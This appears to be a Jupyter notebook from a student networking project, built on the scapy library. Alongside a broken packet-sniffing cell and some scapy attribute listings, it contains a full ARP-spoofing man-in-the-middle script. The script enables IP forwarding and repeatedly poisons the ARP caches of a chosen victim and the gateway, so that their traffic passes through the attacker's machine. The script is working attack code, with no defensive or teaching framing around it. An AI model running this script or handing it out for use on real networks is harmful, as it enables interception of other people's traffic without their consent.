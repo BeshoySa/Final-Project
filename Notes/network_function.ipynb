{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import scapy.all"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "57518\n",
      "34:64:a9:19:da:47\n",
      "34:64:a9:19:da:47\n",
      "ac:64:62:78:87:64\n",
      "128\n",
      "72\n"
     ]
    },
    {
     "ename": "NameError",
     "evalue": "name 'TCP' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[4], line 32\u001b[0m\n\u001b[0;32m     30\u001b[0m         \u001b[38;5;28;01mexcept\u001b[39;00m:\n\u001b[0;32m     31\u001b[0m             \u001b[38;5;28;01mpass\u001b[39;00m\n\u001b[1;32m---> 32\u001b[0m sn \u001b[38;5;241m=\u001b[39m \u001b[43msc\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msniff\u001b[49m\u001b[43m(\u001b[49m\u001b[43miface\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43mEthernet\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43mprn\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43manalyzer_sniff\u001b[49m\u001b[43m,\u001b[49m\u001b[43mcount\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;241;43m50\u001b[39;49m\u001b[43m)\u001b[49m\n\u001b[0;32m     33\u001b[0m \u001b[38;5;66;03m#sn.show()\u001b[39;00m\n",
      "File \u001b[1;32mg:\\Barmgiat\\Network\\Final Project\\venv_py5\\lib\\site-packages\\scapy\\sendrecv.py:1311\u001b[0m, in \u001b[0;36msniff\u001b[1;34m(*args, **kwargs)\u001b[0m\n\u001b[0;32m   1307\u001b[0m \u001b[39m@conf\u001b[39m\u001b[39m.\u001b[39mcommands\u001b[39m.\u001b[39mregister\n\u001b[0;32m   1308\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39msniff\u001b[39m(\u001b[39m*\u001b[39margs, \u001b[39m*\u001b[39m\u001b[39m*\u001b[39mkwargs):\n\u001b[0;32m   1309\u001b[0m     \u001b[39m# type: (*Any, **Any) -> PacketList\u001b[39;00m\n\u001b[0;32m   1310\u001b[0m     sniffer \u001b[39m=\u001b[39m AsyncSniffer()\n\u001b[1;32m-> 1311\u001b[0m     sniffer\u001b[39m.\u001b[39m_run(\u001b[39m*\u001b[39margs, \u001b[39m*\u001b[39m\u001b[39m*\u001b[39mkwargs)\n\u001b[0;32m   1312\u001b[0m     \u001b[39mreturn\u001b[39;00m cast(PacketList, sniffer\u001b[39m.\u001b[39mresults)\n",
      "File \u001b[1;32mg:\\Barmgiat\\Network\\Final Project\\venv_py5\\lib\\site-packages\\scapy\\sendrecv.py:1254\u001b[0m, in \u001b[0;36mAsyncSniffer._run\u001b[1;34m(self, count, store, offline, quiet, prn, lfilter, L2socket, timeout, opened_socket, stop_filter, iface, started_callback, session, session_kwargs, **karg)\u001b[0m\n\u001b[0;32m   1252\u001b[0m p\u001b[39m.\u001b[39msniffed_on \u001b[39m=\u001b[39m sniff_sockets[s]\n\u001b[0;32m   1253\u001b[0m \u001b[39m# on_packet_received handles the prn/storage\u001b[39;00m\n\u001b[1;32m-> 1254\u001b[0m session\u001b[39m.\u001b[39;49mon_packet_received(p)\n\u001b[0;32m   1255\u001b[0m \u001b[39m# check\u001b[39;00m\n\u001b[0;32m   1256\u001b[0m \u001b[39mif\u001b[39;00m (stop_filter \u001b[39mand\u001b[39;00m stop_filter(p)) \u001b[39mor\u001b[39;00m \\\n\u001b[0;32m   1257\u001b[0m         (\u001b[39m0\u001b[39m \u001b[39m<\u001b[39m count \u001b[39m<\u001b[39m\u001b[39m=\u001b[39m session\u001b[39m.\u001b[39mcount):\n",
      "File \u001b[1;32mg:\\Barmgiat\\Network\\Final Project\\venv_py5\\lib\\site-packages\\scapy\\sessions.py:109\u001b[0m, in \u001b[0;36mDefaultSession.on_packet_received\u001b[1;34m(self, pkt)\u001b[0m\n\u001b[0;32m    107\u001b[0m     \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mlst\u001b[39m.\u001b[39mappend(pkt)\n\u001b[0;32m    108\u001b[0m \u001b[39mif\u001b[39;00m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mprn:\n\u001b[1;32m--> 109\u001b[0m     result \u001b[39m=\u001b[39m \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49mprn(pkt)\n\u001b[0;32m    110\u001b[0m     \u001b[39mif\u001b[39;00m result \u001b[39mis\u001b[39;00m \u001b[39mnot\u001b[39;00m \u001b[39mNone\u001b[39;00m:\n\u001b[0;32m    111\u001b[0m         \u001b[39mprint\u001b[39m(result)\n",
      "Cell \u001b[1;32mIn[4], line 19\u001b[0m, in \u001b[0;36manalyzer_sniff\u001b[1;34m(pkt)\u001b[0m\n\u001b[0;32m     17\u001b[0m \u001b[38;5;28mprint\u001b[39m(pkt\u001b[38;5;241m.\u001b[39mttl)\n\u001b[0;32m     18\u001b[0m \u001b[38;5;28mprint\u001b[39m(pkt\u001b[38;5;241m.\u001b[39mlen)\n\u001b[1;32m---> 19\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m pkt\u001b[38;5;241m.\u001b[39mhaslayer(\u001b[43mTCP\u001b[49m):\n\u001b[0;32m     20\u001b[0m     \u001b[38;5;28mprint\u001b[39m(pkt[TCP]\u001b[38;5;241m.\u001b[39mflags)\n\u001b[0;32m     21\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m pkt_num \u001b[38;5;241m==\u001b[39m \u001b[38;5;241m1\u001b[39m:\n\u001b[0;32m     22\u001b[0m     \u001b[38;5;66;03m#print(dir(pkt))\u001b[39;00m\n",
      "\u001b[1;31mNameError\u001b[0m: name 'TCP' is not defined"
     ]
    }
   ],
   "source": [
    "import datetime\n",
    "from scapy import all as sc\n",
    "\n",
    "packet_dict = {}\n",
    "packet_lista = []\n",
    "\n",
    "def analyzer_sniff(pkt):\n",
    "    pkt_num = 0\n",
    "    #print(pkt)\n",
    "    dt_object = datetime.datetime.fromtimestamp(pkt.time)\n",
    "    pkt_num += 1\n",
    "    #print(self.pkt_num)        \n",
    "    print(pkt.id)\n",
    "    print(pkt.src)\n",
    "    print(pkt.src)\n",
    "    print(pkt.dst)\n",
    "    print(pkt.ttl)\n",
    "    print(pkt.len)\n",
    "    if pkt.haslayer(TCP):\n",
    "        print(pkt[TCP].flags)\n",
    "    if pkt_num == 1:\n",
    "        #print(dir(pkt))\n",
    "        try:\n",
    "            packet_dict = {\n",
    "                'time':dt_object,\n",
    "                'ip-src':pkt['IP'].src,\n",
    "                'ip-dst':pkt['IP'].dst,\n",
    "                }\n",
    "            packet_lista.append(packet_dict)\n",
    "        except:\n",
    "            pass\n",
    "sn = sc.sniff(iface=\"Ethernet\",prn=analyzer_sniff,count=50)\n",
    "#sn.show()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "import sys\n",
    "import os\n",
    "import time\n",
    "\n",
    "\n",
    "def help_text():\n",
    "    print(\"\\nUsage:\\n python hd_tcp_syn.py network_range\\n\")\n",
    "    sys.exit()\n",
    "\n",
    "def enable_ip_forwarding():\n",
    "    print (\"\\n[*] Enabling IP Forwarding...\\n\")\n",
    "    os.system(\"echo 1 > /proc/sys/net/ipv4/ip_forward\")\n",
    "\n",
    "def disable_ip_forwarding():\n",
    "    print( \"[*] Disabling IP Forwarding...\")\n",
    "    os.system(\"echo 0 > /proc/sys/net/ipv4/ip_forward\")\n",
    "\n",
    "def get_mac(IP):\n",
    "    conf.verb = 0\n",
    "    ans, unans = srp(Ether(dst = \"ff:ff:ff:ff:ff:ff\")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)\n",
    "    for snd,rcv in ans:\n",
    "        return rcv.sprintf(r\"%Ether.src%\")\n",
    "\n",
    "def reARP():\n",
    "    print (\"\\n[*] Restoring Targets...\")\n",
    "    victimMAC = get_mac(victimIP)\n",
    "    gatewayMAC = get_mac(gatewayIP)\n",
    "    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = \"ff:ff:ff:ff:ff:ff\", hwsrc = victimMAC), count = 7)\n",
    "    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = \"ff:ff:ff:ff:ff:ff\", hwsrc = gatewayMAC), count = 7)\n",
    "    disable_ip_forwarding()\n",
    "    print (\"[*] Shutting Down...\")\n",
    "    sys.exit(1)\n",
    "\n",
    "def trick(gm, vm):\n",
    "    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))\n",
    "    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))\n",
    "\n",
    "def mitm():\n",
    "    try:\n",
    "        victimMAC = get_mac(victimIP)\n",
    "    except Exception:\n",
    "        disable_ip_forwarding()\n",
    "        print (\"[!] Couldn't Find Victim MAC Address\")\n",
    "        print( \"[!] Exiting...\")\n",
    "        sys.exit(1)\n",
    "    try:\n",
    "        gatewayMAC = get_mac(gatewayIP)\n",
    "    except Exception as err:\n",
    "        disable_ip_forwarding()\n",
    "        print (\"[!] Couldn't Find Gateway MAC Address\")\n",
    "        print (\"[!] Exiting...\")\n",
    "        sys.exit(1)\n",
    "    print(\"[*] Poisoning Targets...\") \n",
    "    while 1:\n",
    "        try:\n",
    "            trick(gatewayMAC, victimMAC)\n",
    "            time.sleep(1.5)\n",
    "        except KeyboardInterrupt:\n",
    "            reARP()\n",
    "            break\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    if len(sys.argv) < 2:\n",
    "        help_text()\n",
    "    interface = sys.argv[1]\n",
    "    victimIP = sys.argv[2]\n",
    "    gatewayIP = sys.argv[3] \n",
    "    enable_ip_forwarding()\n",
    "    mitm()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'requests'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[1], line 1\u001b[0m\n\u001b[1;32m----> 1\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mrequests\u001b[39;00m\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'requests'"
     ]
    }
   ],
   "source": [
    "import speedtest_cli\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "['_PickleType', '__all_slots__', '__annotations__', '__bool__', '__bytes__', '__class__', '__class_getitem__', '__contains__', '__deepcopy__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__div__', '__doc__', '__eq__', '__format__', '__ge__', '__getattr__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__iterlen__', '__le__', '__len__', '__lt__', '__module__', '__mul__', '__ne__', '__new__', '__nonzero__', '__orig_bases__', '__parameters__', '__rdiv__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__rtruediv__', '__setattr__', '__setitem__', '__setstate__', '__signature__', '__sizeof__', '__slots__', '__str__', '__subclasshook__', '__truediv__', '__weakref__', '_answered', '_defrag_pos', '_do_summary', '_is_protocol', '_name', '_overload_fields', '_pkt', '_resolve_alias', '_show_or_dump', '_superdir', 'add_parent', 'add_payload', 'add_underlayer', 'aliastypes', 'answers', 'build', 'build_done', 'build_padding', 'build_ps', 'canvas_dump', 'class_default_fields', 'class_default_fields_ref', 'class_dont_cache', 'class_fieldtype', 'class_packetfields', 'clear_cache', 'clone_with', 'command', 'comment', 'copy', 'copy_field_value', 'copy_fields_dict', 'decode_payload_as', 'default_fields', 'default_payload_class', 'delfieldval', 'deprecated_fields', 'direction', 'dispatch_hook', 'display', 'dissect', 'dissection_done', 'do_build', 'do_build_payload', 'do_build_ps', 'do_dissect', 'do_dissect_payload', 'do_init_cached_fields', 'do_init_fields', 'dst', 'explicit', 'extract_padding', 'fields', 'fields_desc', 'fieldtype', 'firstlayer', 'fragment', 'from_hexcap', 'get_field', 'getfield_and_val', 'getfieldval', 'getlayer', 'guess_payload_class', 'hashret', 'haslayer', 'hide_defaults', 'init_fields', 'iterpayloads', 'lastlayer', 'layers', 'lower_bonds', 'match_subclass', 'mysummary', 'name', 'original', 'overload_fields', 'overloaded_fields', 'packetfields', 'parent', 'payload', 'payload_guess', 'pdfdump', 'post_build', 'post_dissect', 'post_dissection', 'post_transforms', 'pre_dissect', 'prepare_cached_fields', 'psdump', 'raw_packet_cache', 'raw_packet_cache_fields', 'remove_parent', 'remove_payload', 'remove_underlayer', 'route', 'self_build', 'sent_time', 'setfieldval', 'show', 'show2', 'show_indent', 'show_summary', 'sniffed_on', 'sprintf', 'src', 'summary', 'svgdump', 'time', 'type', 'underlayer', 'upper_bonds', 'wirelen']"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.7 ('venv_py5': venv)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "36fdb7ee52565e98682a2c057090fb93812f534ad3873ed44ac8f689d9a80c96"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
